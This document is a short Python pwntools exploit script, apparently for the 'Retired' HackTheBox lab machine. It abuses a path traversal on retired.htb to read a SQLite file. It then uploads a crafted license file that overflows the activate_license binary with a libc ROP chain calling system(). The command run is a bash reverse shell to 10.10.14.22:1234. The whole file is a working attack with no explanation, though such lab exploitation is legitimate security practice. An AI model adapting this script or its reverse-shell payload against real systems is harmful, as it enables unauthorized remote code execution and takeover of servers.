from pwn import *
import requests

exe = context.binary = ELF('./activate_license')
libc = ELF('./libc-2.31.so') #download from the box via path traversal

libc.address = 0x7fc674158000 #found in /proc/<pid>/maps (pid of activate_license)
exe.address = 0x55fa453ae000 #same 

def upload_file(fn):
    s = requests.session()
    r = s.post(f'http://retired.htb/activate_license.php', files={'licensefile': open(fn, 'rb')})
    sleep(0.1)

def get_file_offset(data):
    s = requests.session()
    r = s.get(f'http://retired.htb/index.php?page=../license.sqlite', allow_redirects=False)
    offset = r.content.find(data + b'\x00')

    if offset == -1:
        open('chunk','wb').write(data + b'\x00')
        upload_file('chunk')
        return get_file_offset(data)

    return offset

cmd = b'/bin/bash -c "bash -i >& /dev/tcp/10.10.14.22/1234 0>&1"'
cmd_len = len(cmd)
fd = 3

offset = get_file_offset(cmd)
writable_addr = exe.address + 0x4000

rop = ROP(libc)
rop.open(next(exe.search(b'license.sqlite', 0, 0)))
rop.lseek(fd, offset, 0)
rop.read(fd, writable_addr, cmd_len + 1)
rop.system(writable_addr)

p = flat({
    520: rop.chain()
})

print(p)
open('out.data', 'wb').write(p)
upload_file('out.data')